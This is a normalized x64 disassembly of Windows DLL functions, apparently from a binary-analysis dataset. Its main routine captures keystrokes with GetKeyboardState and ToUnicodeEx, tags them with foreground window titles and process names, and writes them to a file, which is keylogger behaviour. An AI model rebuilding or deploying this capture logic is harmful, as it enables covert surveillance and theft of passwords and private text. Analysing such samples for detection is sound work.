add rsp 0x20
pop rbx
jmp sub_180010a80
xor eax eax
add rsp 0x20
pop rbx
retn
call sub_180010a80
mov [ rbx + 0x48 ] 0x0
add rsp 0x20
pop rbx
retn
sub_180011c90
mov [ rsp + 0x10 ] rdx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x40 ] rbx
mov rbx rdx
cmp [ rdx ] 0x0
je r-xdata
mov rbx [ rdx + 0x8 ]
test rbx rbx
je r-xdata
add rcx 0x70
call sub_1800086f0
nop
mov rbx [ rbx + 0x8 ]
test rbx rbx
je r-xdata
xor al al
or eax 0xffffffff
[ rbx + 0x8 ] eax
dec eax
jne r-xdata
mov al 0x1
jmp r-xdata
or eax 0xffffffff
[ rbx + 0x8 ] eax
dec eax
jne r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x8 ]
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x8 ]
sub_180011d30
mov r11 rsp
push rsi
push rdi
push r12
sub rsp 0xa0
mov [ rsp + 0x60 ] 0xfffffffffffffffe
mov [ r11 + 0x10 ] rbx
mov [ r11 + 0x18 ] rbp
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x90 ] rax
mov rdi rcx
mov [ r11 - 0x78 ] rcx
xor r12d r12d
mov ebp r12d
mov [ r11 - 0x80 ] r12d
mov [ rcx + 0x8 ] r12w
lea rax [ r--data ]
mov [ rcx ] rax
add rcx 0x10
call sub_18000b6a0
nop
lea rcx [ rdi + 0x58 ]
call sub_18000d760
nop
lea rcx [ rdi + 0x70 ]
lea rdx [ rsp + 0x30 ]
call sub_1800134e0
nop
lea rcx [ rdi + 0xa0 ]
call sub_18002022c
nop
mov [ rdi + 0x38 ] r12d
lea rcx [ rdi + 0x10 ]
call sub_18000b280
mov [ rdi + 0xa8 ] eax
mov eax [ rw-data ]
mov [ rdi + 0x3c ] eax
lea ecx [ r12 + 0x30 ]
call sub_180021000
mov [ rsp + 0x38 ] rax
test rax rax
je r-xdata
mov rbx r12
mov [ rsp + 0x20 ] 0xb
lea r9 [ rw-data ]
lea r8d [ r12 + 0x3e ]
lea rdx [ rw-data ]
mov rcx rax
call sub_180017530
mov rbx rax
jmp r-xdata
mov rax r12
movups xmm0 [ rw-data ]
movaps [ rsp + 0x50 ] xmm0
lea rdx [ rsp + 0x68 ]
mov rcx rbx
call sub_180017bc0
nop
mov ebp 0x1
mov [ rsp + 0x38 ] ebp
cmp [ rax + 0x18 ] 0x8
jb r-xdata
mov ecx 0x98
call sub_180021000
mov rsi rax
mov [ rsp + 0x48 ] rax
test rax rax
je r-xdata
test rbx rbx
je r-xdata
cmp [ rsp + 0x80 ] 0x8
jb r-xdata
lea r9 [ rsp + 0x50 ]
mov r8 rax
xor edx edx
mov rcx rsi
call sub_18001e940
jmp r-xdata
mov rax [ rax ]
mov [ rdi + 0x40 ] r12
mov [ rdi + 0x50 ] r12
movzx ecx [ rw-data ]
mov [ rdi + 0x8 ] cx
mov [ rdi + 0x48 ] 0x0
mov rax rdi
mov rcx [ rsp + 0x90 ]
xor rcx rsp
call sub_1800212e0
lea r11 [ rsp + 0xa0 ]
mov rbx [ r11 + 0x28 ]
mov rbp [ r11 + 0x30 ]
mov rsp r11
pop r12
pop rdi
pop rsi
retn
mov rcx rbx
call sub_180017560
mov rcx rbx
call j_sub_18002094c#2
mov rcx [ rsp + 0x68 ]
call j_sub_18002094c#2
mov [ rdi + 0x30 ] rax
test bpl 0x1
je r-xdata
sub_180011ee0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov ebx edx
mov rdi rcx
call sub_1800117f0
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_18002094c#2
sub_180011f10
push rbx
sub rsp 0x40
mov rbx rcx
mov [ rcx + 0x8 ] 0x0
mov ecx 0x40
call sub_180021000
test rax rax
je r-xdata
lea rdx [ rsp + 0x50 ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x50 ] 0x0
call sub_180020424
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] r11
call sub_1800210a4
int3
mov [ rbx ] rax
mov [ rax ] rax
mov rax [ rbx ]
mov [ rax + 0x8 ] rax
mov rax rbx
add rsp 0x40
pop rbx
retn
sub_180011f80
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx rcx
add rcx 0x8
mov edi edx
call sub_180020274
mov r8 [ rbx + 0x40 ]
mov rax [ r8 ]
mov [ rbx + 0x58 ] rax
cmp rax r8
je r-xdata
lea rcx [ rbx + 0x8 ]
call sub_18002027c
xor al al
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
nop [ rax ] eax
lea rcx [ rbx + 0x8 ]
call sub_18002027c
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov al 0x1
add rsp 0x20
pop rdi
retn
mov rcx [ rax ]
mov [ rbx + 0x58 ] rcx
mov rax [ rbx + 0x40 ]
cmp rcx rax
jne r-xdata
mov rax [ rbx + 0x58 ]
cmp [ rax + 0x10 ] edi
je r-xdata
sub_180012000
push rbx
sub rsp 0x20
cmp [ rcx + 0x20 ] 0x10
mov rbx rcx
jb r-xdata
mov [ rbx + 0x20 ] 0xf
mov [ rbx + 0x18 ] 0x0
mov [ rbx + 0x8 ] 0x0
add rsp 0x20
pop rbx
retn
mov rcx [ rcx + 0x8 ]
call j_sub_18002094c#2
sub_180012040
mov rax rsp
push rbp
push r12
push r13
push r14
push r15
lea rbp [ rax - 0xc8 ]
sub rsp 0x1a0
mov [ rbp - 0x40 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x90 ] rax
mov r12 rcx
xor edi edi
mov [ rsp + 0x7c ] edi
mov [ rsp + 0x70 ] edi
mov [ rsp + 0x54 ] edi
mov esi edi
mov [ rsp + 0x40 ] edi
mov [ rsp + 0x58 ] edi
mov r15d edi
mov [ rsp + 0x44 ] edi
mov [ rsp + 0x6c ] edi
mov [ rbp - 0x80 ] edi
mov [ rsp + 0x68 ] edi
mov [ rsp + 0x78 ] edi
mov [ rsp + 0x50 ] sil
xor r13b r13b
mov r14d edi
mov [ rbp - 0x50 ] rdi
mov [ rbp - 0x48 ] rdi
mov [ rbp - 0x78 ] rdi
mov [ rbp - 0x60 ] rdi
mov [ rsp + 0x48 ] edi
mov [ rsp + 0x4c ] di
lea ecx [ rdi + 0x30 ]
call sub_180021000
mov [ rbp - 0x68 ] rax
test rax rax
je r-xdata
mov rbx rdi
mov rcx rax
call sub_180017520
mov rbx rax
jmp r-xdata
add r8 r8
mov rdx rax
mov rcx [ r12 + 0x10 ]
call sub_1800205e0
cmp [ rbp + 0x30 ] 0x8
jb r-xdata
mov rax [ rax ]
mov r8d 0xb
lea rdx [ rw-data ]
mov rcx rbx
call sub_1800175a0
mov r8d 0x3c
lea rdx [ rw-data ]
mov rcx rbx
call sub_180017590
lea rdx [ rbp - 0x10 ]
mov rcx rbx
call sub_180017bc0
mov rdi rax
lea rdx [ rbp + 0x18 ]
mov rcx rbx
call sub_180017bc0
mov r8 [ rdi + 0x10 ]
cmp [ rax + 0x18 ] 0x8
jb r-xdata
mov [ rbp + 0x30 ] 0x7
xor edi edi
mov [ rbp + 0x28 ] rdi
mov [ rbp + 0x18 ] di
cmp [ rbp + 0x8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x18 ]
call j_sub_18002094c#2
lea rdx [ rbp + 0x18 ]
mov rcx rbx
call sub_180017bc0
mov rax [ rax + 0x10 ]
mov [ rbp - 0x70 ] rax
cmp [ rbp + 0x30 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x10 ]
call j_sub_18002094c#2
mov [ rbp + 0x30 ] 0x7
mov [ rbp + 0x28 ] rdi
mov [ rbp + 0x18 ] di
mov r8d 0x2c
lea rdx [ rw-data ]
mov rcx rbx
call sub_180017590
lea rdx [ rbp - 0x10 ]
mov rcx rbx
call sub_180017bc0
mov rdi rax
lea rdx [ rbp - 0x38 ]
mov rcx rbx
call sub_180017bc0
mov r8 [ rdi + 0x10 ]
cmp [ rax + 0x18 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x18 ]
call j_sub_18002094c#2
add r8 r8
mov rdx rax
mov rcx [ r12 + 0x20 ]
call sub_1800205e0
cmp [ rbp - 0x20 ] 0x8
jb r-xdata
mov rax [ rax ]
mov [ rbp - 0x20 ] 0x7
xor eax eax
mov [ rbp - 0x28 ] rax
mov [ rbp - 0x38 ] ax
cmp [ rbp + 0x8 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x38 ]
call j_sub_18002094c#2
lea rdx [ rbp + 0x68 ]
mov rcx rbx
call sub_180017bc0
mov rax [ rax + 0x10 ]
mov [ rbp - 0x58 ] rax
cmp [ rbp + 0x80 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x10 ]
call j_sub_18002094c#2
mov r8d 0x30
lea rdx [ rw-data ]
mov rcx rbx
call sub_180017590
lea rdx [ rbp + 0x68 ]
mov rcx rbx
call sub_180017bc0
mov rdi rax
lea rdx [ rbp - 0x38 ]
mov rcx rbx
call sub_180017bc0
mov r8 [ rdi + 0x10 ]
cmp [ rax + 0x18 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x68 ]
call j_sub_18002094c#2
add r8 r8
mov rdx rax
mov rcx [ r12 + 0x18 ]
call sub_1800205e0
cmp [ rbp - 0x20 ] 0x8
jb r-xdata
mov rax [ rax ]
mov [ rbp - 0x20 ] 0x7
xor edi edi
mov [ rbp - 0x28 ] rdi
mov [ rbp - 0x38 ] di
cmp [ rbp + 0x80 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x38 ]
call j_sub_18002094c#2
lea rdx [ rbp - 0x38 ]
mov rcx rbx
call sub_180017bc0
mov rax [ rax + 0x10 ]
mov [ rbp - 0x68 ] rax
cmp [ rbp - 0x20 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x68 ]
call j_sub_18002094c#2
mov [ rbp - 0x20 ] 0x7
mov [ rbp - 0x28 ] rdi
mov [ rbp - 0x38 ] di
mov r8d 0x62
lea rdx [ rw-data ]
mov rcx rbx
call sub_180017590
lea rdx [ rbp - 0x10 ]
mov rcx rbx
call sub_180017bc0
cmp [ rax + 0x18 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x38 ]
call j_sub_18002094c#2
mov [ rsp + 0x30 ] rdi
mov [ rsp + 0x28 ] 0x80
mov [ rsp + 0x20 ] 0x3
xor r9d r9d
mov edx 0x40000000
lea r8d [ r9 + 0x3 ]
mov rcx rax
call [ CreateFileW@IAT ]
mov rdi rax
mov [ rsp + 0x60 ] rax
cmp [ rbp + 0x8 ] 0x8
jb r-xdata
mov rax [ rax ]
mov [ rbp + 0x8 ] 0x7
xor eax eax
mov [ rbp ] rax
mov [ rbp - 0x10 ] ax
lea r8d [ rax + 0x7 ]
lea rdx [ rw-data ]
mov rcx rbx
call sub_180017590
lea rdx [ rbp + 0x40 ]
mov rcx rbx
call sub_180017d20
nop
test rbx rbx
je r-xdata
mov rcx [ rbp - 0x10 ]
call j_sub_18002094c#2
test rdi rdi
jne r-xdata
mov rcx rbx
call sub_180017560
mov rcx rbx
call j_sub_18002094c#2
call [ GetCurrentThreadId@IAT ]
mov [ rsp + 0x74 ] eax
cmp [ rbp + 0x58 ] 0x10
jb r-xdata
call [ GetForegroundWindow@IAT ]
mov r14 rax
test rax rax
jne r-xdata
test r15d r15d
jne r-xdata
mov eax 0x1
jmp r-xdata
mov rcx [ rbp + 0x40 ]
call j_sub_18002094c#2
cmp rax [ rbp - 0x50 ]
je r-xdata
mov ecx 0x12c
call [ Sleep@IAT ]
jmp r-xdata
cmp [ rsp + 0x78 ] 0x64
jae r-xdata
mov rcx [ rbp + 0x90 ]
xor rcx rsp
call sub_1800212e0
lea r11 [ rsp + 0x1a0 ]
mov rbx [ r11 + 0x38 ]
mov rsi [ r11 + 0x40 ]
mov rdi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
test r15d r15d
je r-xdata
lea rdx [ rsp + 0x7c ]
mov rcx rax
call [ GetWindowThreadProcessId@IAT ]
mov edi eax
mov [ rsp + 0x50 ] 0x0
cmp eax r15d
je r-xdata
mov ecx 0x14
call [ Sleep@IAT ]
test edi edi
je r-xdata
call [ GetTickCount@IAT ]
mov edi eax
mov ecx eax
sub ecx [ rbp - 0x80 ]
cmp ecx 0x1f4
mov esi [ rsp + 0x40 ]
mov ebx 0x1
jbe r-xdata
mov rcx [ r12 + 0x30 ]
call [ GetKeyboardState@IAT ]
test eax eax
je r-xdata
mov edi [ rsp + 0x44 ]
test r15d r15d
je r-xdata
mov edi [ rsp + 0x44 ]
lea rcx [ rbp - 0x78 ]
call [ GetCursorPos@IAT ]
test eax eax
je r-xdata
xor r9d r9d
mov edi r9d
nop [ rax ] eax
mov ecx 0x1f4
call [ Sleep@IAT ]
mov r8d ebx
mov edx [ rsp + 0x74 ]
mov ecx edi
call [ AttachThreadInput@IAT ]
test eax eax
je r-xdata
xor r8d r8d
mov edx [ rsp + 0x74 ]
mov ecx r15d
call [ AttachThreadInput@IAT ]
xor edx edx
mov r8d 0x100
mov rcx [ r12 + 0x38 ]
call sub_180021150
xor eax eax
mov r15d eax
mov ecx [ rbp - 0x74 ]
sub ecx [ rbp - 0x5c ]
mov eax [ rbp - 0x78 ]
sub eax [ rbp - 0x60 ]
imul eax eax
imul ecx ecx
add eax ecx
mov [ rsp + 0x78 ] eax
je r-xdata
inc edi
cmp edi 0x100
jae r-xdata
movzx ecx [ rdx + rcx ]
mov [ rdx + r8 ] cl
mov rax [ r12 + 0x30 ]
test [ rdx + rax ] 0x80
jne r-xdata
mov edi [ rsp + 0x44 ]
mov r15d edi
mov [ rbp - 0x50 ] r14
mov edi ebx
mov [ rsp + 0x44 ] ebx
test esi esi
je r-xdata
mov rcx [ rbp - 0x78 ]
mov [ rbp - 0x60 ] rcx
call [ WindowFromPoint@IAT ]
mov rbx rax
test rax rax
je r-xdata
jmp r-xdata
xor sil sil
cmp edi 0x8
je r-xdata
mov r8d [ rsp + 0x7c ]
cmp r8d [ rsp + 0x70 ]
je r-xdata
test r13b r13b
jne r-xdata
mov esi [ rsp + 0x40 ]
jmp r-xdata
mov rsi [ rbp - 0x48 ]
cmp rax rsi
jne r-xdata
mov edx edi
mov r8 [ r12 + 0x38 ]
mov rcx [ r12 + 0x30 ]
movzx eax [ rdx + r8 ]
cmp [ rdx + rcx ] al
je r-xdata
cmp edi 0x1b
je r-xdata
cmp edi 0xb
je r-xdata
mov ecx 0x64
call [ Sleep@IAT ]
jmp r-xdata
mov [ rsp + 0x70 ] r8d
xor edx edx
mov ecx 0x410
call [ OpenProcess@IAT ]
mov rbx rax
call [ GetLastError@IAT ]
test rbx rbx
je r-xdata
mov r9 [ rbp - 0x58 ]
add r9d esi
xor esi esi
mov [ rsp + 0x38 ] rsi
mov [ rsp + 0x30 ] rsi
mov [ rsp + 0x28 ] 0x230
mov rax [ r12 + 0x28 ]
mov [ rsp + 0x20 ] rax
mov r8 [ r12 + 0x20 ]
xor edx edx
mov ecx 0xfde9
call [ WideCharToMultiByte@IAT ]
mov [ rsp + 0x20 ] rsi
lea r9 [ rsp + 0x48 ]
mov r8d eax
mov rdx [ r12 + 0x28 ]
mov rcx [ rsp + 0x60 ]
call [ WriteFile@IAT ]
mov [ rsp + 0x40 ] esi
mov r9 [ rbp - 0x70 ]
add r9d [ rsp + 0x54 ]
xor r13d r13d
mov [ rsp + 0x38 ] r13
mov [ rsp + 0x30 ] r13
mov [ rsp + 0x28 ] 0x230
mov rax [ r12 + 0x28 ]
mov [ rsp + 0x20 ] rax
mov r8 [ r12 + 0x10 ]
xor edx edx
mov ecx 0xfde9
call [ WideCharToMultiByte@IAT ]
mov [ rsp + 0x20 ] r13
lea r9 [ rsp + 0x48 ]
mov r8d eax
mov rdx [ r12 + 0x28 ]
mov rcx [ rsp + 0x60 ]
call [ WriteFile@IAT ]
mov r13b 0x1
mov ebx 0x1
xor edx edx
mov rcx rbx
call [ GetWindowThreadProcessId@IAT ]
cmp eax r15d
je r-xdata
mov eax edi
sub eax [ rsp + 0x6c ]
cmp eax 0x1f4
jb r-xdata
mov ebx [ rsp + 0x40 ]
test ebx ebx
je r-xdata
cmp edi 0x20
jbe r-xdata
cmp edi 0xd
jbe r-xdata
mov ebx 0x1
jmp r-xdata
movsxd rdi [ rbp - 0x70 ]
mov rax [ r12 + 0x10 ]
lea rdx [ rax + rdi * 2 ]
mov r8d 0x104
mov rcx rbx
call GetProcessImageFileNameW
mov [ rsp + 0x54 ] eax
test eax eax
je r-xdata
cmp rbx r14
cmovne rsi rbx
mov [ rbp - 0x48 ] rsi
mov rax [ r12 + 0x18 ]
mov rcx [ rbp - 0x68 ]
movsxd rsi ecx
lea r9 [ rax + rsi * 2 ]
lea rax [ rsp + 0x58 ]
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x28 ] 0xa
mov [ rsp + 0x20 ] 0x3
mov edx 0xd
mov r8d 0x104
mov rcx rbx
call [ SendMessageTimeoutW@IAT ]
test rax rax
je r-xdata
xor eax eax
mov edi eax
mov [ rsp + 0x44 ] eax
mov esi [ rsp + 0x40 ]
lea ebx [ rax + 0x1 ]
jmp r-xdata
mov rbx r14
mov [ rsp + 0x6c ] edi
cmp r14 rsi
je r-xdata
cmp [ rsp + 0x40 ] 0x5
jbe r-xdata
xor esi esi
test r13b r13b
jne r-xdata
cmp edi 0x2a
jbe r-xdata
cmp edi 0x2a
jb r-xdata
mov rcx rbx
call [ CloseHandle@IAT ]
mov ebx 0x1
jmp r-xdata
mov rcx [ r12 + 0x10 ]
lea rcx [ rcx + rdi * 2 ]
call [ PathFindFileNameW@IAT ]
mov rdi rax
xor ecx ecx
mov eax ecx
mov edx ecx
movzx ecx [ rdi ]
test cx cx
je r-xdata
mov edx [ rsp + 0x58 ]
test edx edx
je r-xdata
cmp edi 0x2
jbe r-xdata
cmp [ rsp + 0x50 ] 0x1
jne r-xdata
mov r9 [ rbp - 0x58 ]
add r9d ebx
mov [ rsp + 0x38 ] rsi
mov [ rsp + 0x30 ] rsi
mov [ rsp + 0x28 ] 0x230
mov rax [ r12 + 0x28 ]
mov [ rsp + 0x20 ] rax
mov r8 [ r12 + 0x20 ]
xor edx edx
mov ecx 0xfde9
call [ WideCharToMultiByte@IAT ]
mov [ rsp + 0x20 ] rsi
lea r9 [ rsp + 0x48 ]
mov r8d eax
mov rdx [ r12 + 0x28 ]
mov rcx [ rsp + 0x60 ]
call [ WriteFile@IAT ]
mov [ rsp + 0x40 ] esi
jmp r-xdata
mov r9 [ rbp - 0x70 ]
add r9d [ rsp + 0x54 ]
mov [ rsp + 0x38 ] rsi
mov [ rsp + 0x30 ] rsi
mov [ rsp + 0x28 ] 0x230
mov rax [ r12 + 0x28 ]
mov [ rsp + 0x20 ] rax
mov r8 [ r12 + 0x10 ]
xor edx edx
mov ecx 0xfde9
call [ WideCharToMultiByte@IAT ]
mov [ rsp + 0x20 ] rsi
lea r9 [ rsp + 0x48 ]
mov r8d eax
mov rdx [ r12 + 0x28 ]
mov rcx [ rsp + 0x60 ]
call [ WriteFile@IAT ]
mov r13b 0x1
mov ecx r15d
call [ GetKeyboardLayout@IAT ]
mov rbx rax
mov r8 rax
xor edx edx
mov ecx edi
call [ MapVirtualKeyExW@IAT ]
test eax eax
je r-xdata
cmp edi 0x30
jb r-xdata
mov rcx r12
call sub_180011f80
mov ecx [ rsp + 0x50 ]
movzx ecx cl
cmp al 0x1
mov eax 0x1
cmove ecx eax
mov [ rsp + 0x50 ] ecx
xor r13b r13b
nop
mov r8 [ r12 + 0x18 ]
lea rdi [ r8 + rsi * 2 ]
xor eax eax
or rcx 0xffffffffffffffff
[ rdi ]
not rcx
dec rcx
cmp rdx rcx
jne r-xdata
call [ GetTickCount@IAT ]
mov [ rbp - 0x80 ] eax
mov [ rsp + 0x50 ] 0x0
lea rdx [ rbp + 0x40 ]
cmp [ rbp + 0x58 ] 0x10
cmovae rdx [ rbp + 0x40 ]
mov [ rsp + 0x20 ] r9
lea r9 [ rsp + 0x48 ]
mov r8d [ rbp + 0x50 ]
mov rcx [ rsp + 0x60 ]
call [ WriteFile@IAT ]
xor r9d r9d
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x28 ] 0x0
mov [ rsp + 0x20 ] 0x2
lea r9 [ rsp + 0x4c ]
mov r8 [ r12 + 0x30 ]
mov edx eax
mov ecx edi
call [ ToUnicodeEx@IAT ]
cmp eax 0x1
jne r-xdata
ror edx 0xd
movzx ecx cx
add edx ecx
inc rax
movzx ecx [ rdi + rax * 2 ]
test cx cx
jne r-xdata
mov rax [ rbp - 0x68 ]
lea ecx [ rax + rdx + 0x1 ]
xor eax eax
mov [ r8 + rcx * 2 ] ax
cmp rbx r14
jne r-xdata
movzx edx [ rsp + 0x4c ]
mov ebx [ rsp + 0x40 ]
mov r8 [ rbp - 0x58 ]
cmp dx 0x1f
jbe r-xdata
xor ebx ebx
mov rax [ r12 + 0x18 ]
lea rdi [ rax + rsi * 2 ]
xor ebx ebx
mov edx ebx
mov ecx ebx
movzx eax [ rdi ]
test ax ax
je r-xdata
cmp dx 0x8
jne r-xdata
lea ecx [ r8 + rbx ]
mov rax [ r12 + 0x20 ]
mov [ rax + rcx * 2 ] dx
inc ebx
mov [ rsp + 0x40 ] ebx
movzx eax [ r12 ]
movzx esi sil
cmp ebx eax
mov eax 0x1
cmove esi eax
movzx edx [ rsp + 0x4c ]
mov rdi [ rsp + 0x60 ]
mov r9 [ rbp - 0x70 ]
add r9d [ rsp + 0x54 ]
mov [ rsp + 0x38 ] rbx
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x28 ] 0x230
mov rax [ r12 + 0x28 ]
mov [ rsp + 0x20 ] rax
mov r8 [ r12 + 0x10 ]
xor edx edx
mov ecx 0xfde9
call [ WideCharToMultiByte@IAT ]
mov [ rsp + 0x20 ] rbx
lea r9 [ rsp + 0x48 ]
mov r8d eax
mov rdx [ r12 + 0x28 ]
mov rdi [ rsp + 0x60 ]
mov rcx rdi
call [ WriteFile@IAT ]
mov r13b 0x1
jmp r-xdata
cmp ecx [ rsp + 0x68 ]
jne r-xdata
nop [ rax ] eax
test sil sil
je r-xdata
lea ecx [ r8 + rbx ]
mov rax [ r12 + 0x20 ]
mov edx 0x5d
mov [ rax + rcx * 2 ] dx
inc ebx
mov [ rsp + 0x40 ] ebx
movzx eax [ r12 ]
cmp ebx eax
je r-xdata
mov r9 [ rbp - 0x68 ]
add r9d [ rsp + 0x58 ]
mov [ rsp + 0x38 ] rbx
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x28 ] 0x230
mov rax [ r12 + 0x28 ]
mov [ rsp + 0x20 ] rax
mov r8 [ r12 + 0x18 ]
xor edx edx
mov ecx 0xfde9
call [ WideCharToMultiByte@IAT ]
mov [ rsp + 0x20 ] rbx
lea r9 [ rsp + 0x48 ]
mov r8d eax
mov rdx [ r12 + 0x28 ]
mov rcx rdi
call [ WriteFile@IAT ]
mov esi [ rsp + 0x40 ]
jmp r-xdata
mov [ rsp + 0x68 ] ecx
jmp r-xdata
nop [ rax + rax ] ax
ror ecx 0xd
movzx eax ax
add ecx eax
inc rdx
movzx eax [ rdi + rdx * 2 ]
test ax ax
jne r-xdata
jmp r-xdata
test r13b r13b
jne r-xdata
sub_180012b60
push rbx
sub rsp 0x20
mov eax [ rdx ]
mov r10 r8
xor r8d r8d
mov [ rcx ] eax
mov rbx rcx
add rcx 0x8
mov [ rcx + 0x18 ] 0xf
mov [ rcx + 0x10 ] r8
or r9 0xffffffffffffffff
mov rdx r10
mov [ rcx ] r8b
mov [ rsp + 0x30 ] r8d
call sub_180008000
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_180012ba0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rsi
sub rsp 0x20
mov rax [ rcx ]
xor ebp ebp
mov rsi rcx
mov rbx [ rax ]
mov [ rax ] rax
mov rax [ rcx ]
mov [ rax + 0x8 ] rax
mov [ rcx + 0x8 ] rbp
cmp rbx [ rcx ]
je r-xdata
mov rbx [ rsp + 0x38 ]
mov rbp [ rsp + 0x40 ]
add rsp 0x20
pop rsi
retn
mov [ rsp + 0x30 ] rdi
mov [ rbx + 0x30 ] 0xf
mov [ rbx + 0x28 ] rbp
mov rcx rbx
mov [ rbx + 0x18 ] bpl
call j_sub_18002094c#2
mov rbx rdi
cmp rdi [ rsi ]
jne r-xdata
mov rcx [ rbx + 0x18 ]
call j_sub_18002094c#2
cmp [ rbx + 0x30 ] 0x10
mov rdi [ rbx ]
jb r-xdata
mov rdi [ rsp + 0x30 ]
sub_180012c20
push rbx
sub rsp 0x20
mov eax [ rdx ]
xor r9d r9d
mov rbx rcx
mov [ rcx ] eax
add rcx 0x8
mov rdx r8
mov [ rcx + 0x18 ] 0xf
mov [ rcx + 0x10 ] r9
mov [ rcx ] r9b
mov [ rsp + 0x30 ] r9d
call sub_1800083f0
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_180012c60
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
movzx eax [ rdx ]
mov rbx rcx
xor edi edi
xor ecx ecx
test ax ax
je r-xdata
lea rcx [ rbx + 0x8 ]
call sub_180020274
cmp [ rbx + 0x48 ] 0x0
je r-xdata
nop
xor al al
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rcx [ rbx + 0x40 ]
mov rax [ rcx ]
mov [ rbx + 0x58 ] rax
cmp rax rcx
je r-xdata
ror edi 0xd
movzx eax ax
inc rcx
add edi eax
movzx eax [ rdx + rcx * 2 ]
test ax ax
jne r-xdata
lea rcx [ rbx + 0x8 ]
call sub_18002027c
mov rax [ rbx + 0x58 ]
cmp [ rax + 0x10 ] edi
je r-xdata
mov rdi rax
cmp rax [ rbx + 0x40 ]
je r-xdata
mov rcx [ rax ]
mov [ rbx + 0x58 ] rcx
mov rax [ rbx + 0x40 ]
cmp rcx rax
jne r-xdata
lea rcx [ rbx + 0x8 ]
call sub_18002027c
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov al 0x1
add rsp 0x20
pop rdi
retn
mov rcx [ rax + 0x8 ]
mov rax [ rax ]
mov [ rcx ] rax
mov rdx [ rdi ]
mov rax [ rdi + 0x8 ]
mov [ rdx + 0x8 ] rax
cmp [ rdi + 0x30 ] 0x10
jb r-xdata
mov [ rdi + 0x30 ] 0xf
mov [ rdi + 0x28 ] 0x0
mov rcx rdi
mov [ rdi + 0x18 ] 0x0
call j_sub_18002094c#2
dec [ rbx + 0x48 ]
mov rcx [ rdi + 0x18 ]
call j_sub_18002094c#2
sub_180012d80
push r12
sub rsp 0x60
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov [ rsp + 0x70 ] rbx
mov [ rsp + 0x78 ] rsi
mov [ rsp + 0x80 ] rdi
mov r12 r9
mov rdi r8
mov rsi rdx
mov ecx 0x40
call sub_180021000
mov rbx rax
mov [ rsp + 0x20 ] rax
test rax rax
je r-xdata
mov [ rsp + 0x20 ] 0x0
lea rdx [ rsp + 0x20 ]
lea rcx [ rsp + 0x40 ]
call sub_180020424
lea r11 [ r--data ]
mov [ rsp + 0x40 ] r11
lea rdx [ r--data ]
lea rcx [ rsp + 0x40 ]
call sub_1800210a4
int3
mov [ rax ] rsi
mov [ rax + 0x8 ] rdi
lea rcx [ rax + 0x10 ]
mov [ rsp + 0x30 ] rcx
mov [ rsp + 0x38 ] rcx
test rcx rcx
je r-xdata
mov rax rbx
jmp r-xdata
mov eax [ r12 ]
mov [ rcx ] eax
add rcx 0x8
mov [ rcx + 0x18 ] 0xf
mov [ rcx + 0x10 ] 0x0
mov [ rcx ] 0x0
lea rdx [ r12 + 0x8 ]
call sub_1800083f0
nop
mov rbx [ rsp + 0x70 ]
mov rsi [ rsp + 0x78 ]
mov rdi [ rsp + 0x80 ]
add rsp 0x60
pop r12
retn
sub_180012e60
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
cmp [ rcx + 0x48 ] 0x0
mov rdi rcx
je r-xdata
mov rcx [ rdi + 0x18 ]
xor edx edx
mov r8d 0x2000
call [ VirtualFree@IAT ]
mov rcx [ rdi + 0x10 ]
xor edx edx
mov r8d 0x2000
call [ VirtualFree@IAT ]
mov rcx [ rdi + 0x20 ]
xor edx edx
mov r8d 0x2000
call [ VirtualFree@IAT ]
mov rcx [ rdi + 0x28 ]
call sub_18002094c
mov rcx [ rdi + 0x30 ]
call sub_18002094c
mov rcx [ rdi + 0x38 ]
call sub_18002094c
lea rcx [ rdi + 0x40 ]
call sub_180012ba0
mov rcx [ rdi + 0x40 ]
call j_sub_18002094c#2
lea rcx [ rdi + 0x8 ]
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
jmp sub_180020254
mov [ rsp + 0x30 ] rsi
xor esi esi
